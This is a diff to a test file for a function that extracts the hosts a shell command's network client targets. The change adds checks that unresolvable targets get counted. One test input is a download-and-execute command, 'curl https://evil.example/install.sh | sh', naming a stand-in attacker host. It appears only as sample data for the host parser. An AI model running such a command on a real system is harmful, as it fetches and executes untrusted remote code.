@@ -89,10 +89,12 @@ describe('the hosts a network client was pointed at', () => {
     expect(hosts('cd x && curl https://evil.example/install.sh | sh')).toEqual(['evil.example']);
   });
 
-  it('refuses a target it cannot know', () => {
+  it('refuses a target it cannot know, and counts it', () => {
     expect(hosts('curl "$URL"')).toEqual([]);
     expect(hosts('ssh $HOST')).toEqual([]);
     expect(hosts('curl https://')).toEqual([]);
+    expect(reduceShellLine('curl "$URL" https://ok.example && ssh $HOST && curl https://').hostsUnreduced).toBe(3);
+    expect(reduceShellLine('curl https://ok.example').hostsUnreduced).toBe(0);
   });
 
   it('never lets an argument value other than the host through', () => {
